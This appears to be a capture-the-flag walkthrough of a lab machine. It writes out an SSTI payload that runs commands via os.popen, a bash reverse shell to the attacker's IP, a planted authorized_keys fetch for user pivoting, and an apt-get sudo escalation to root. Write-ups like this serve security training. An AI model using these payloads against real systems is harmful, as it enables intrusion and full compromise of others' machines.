Skills:

- Applying brute force to discover valid credentials on a custom application [Python Scripting]
- Server Side Template Injection (SSTI) - Exploit the SSTI by calling subprocess.Popen
- Uncompiling pyc files with uncompyle6
- Python script analysis + Abusing cron job [User Pivoting]
- Abusing sudoers privilege in order to create a new user and read /etc/sudoers file by assigning --gid 0
- Creating a user that exists as described in the sudoers file but does not exist on the system
- Abusing sudoers privilege (apt-get) for the newly created user [Privilege Escalation]

After enumerate the victim machine, I checked port 31337 using netcat, which prompted me for a username and password, trying default credentials like guest:guest worked, but if you prefer, you can attempt to brute force the login panel by creating a bash script

This is a ticketing system application that updates information on the website on port 5000. The website uses werkzeug with python, allowing me to attempt a server side template injection exploit

Within the ticketing system application, I created a new ticket and used an SSTI payload:
```bash
>open
>Title: {{7*7}}
>Description: {{'7'*7*}}
```

Checking the website ,  the payload worked, knowing this We can try to execute commands. https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/#exploit-the-ssti-by-calling-ospopenread

```bash
>open
>Title: {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
>Description: test
```

the command injection worked, now we can try to establish a reverse shell
```bash

#on my machine
nc -nlvp 1234

#on the application
>open
>Title: {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/192.168.111.100/1234 0>&1"').read()}}
>Description: test
```

In this way we gain access to the victim machine
```bash
#check some permissions
>sudo -l --> nothing
>id --> nothing

#check for suid permissions
>find / -perm -4000 2>/dev/null --> nothing

#checking files
>/opt/ ls -la
>/opt/.syncer.cpython-38.pyc --> compiled python file

#checking process
>./pspy --> the user saint execute the syncer.py script
>

#decompiling the .pyc files
>Use uncompyle6
>uncompyle6 file.pyc
ç
#check the syncer.py 
#create a file
>/tmp/ 08-10-2023.config.json
> put inside:
{
	"URL": "http://192.168.0.100/authorized_keys",
	"Output": "/home/saint/.ssh/authorized_keys"
}

#on my machine
> ssh-keygen
> cat ~/.ssh/id_ed25519.pub > authorized_keys
> sudo python -m http.server 80
> ssh saint@192.168.0.105
#check permissions 
>saint: sudo -l --> the user saint can create users!
>sudo adduser kvzlx --gid 0 | in the sudoers file the user jason has privilege, but this user doesn't exist, so I can create it'
>sudo adduser jason --> create a user
>the user jason have root privilege on apt-get
>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
```

Now we gain access as the user root.



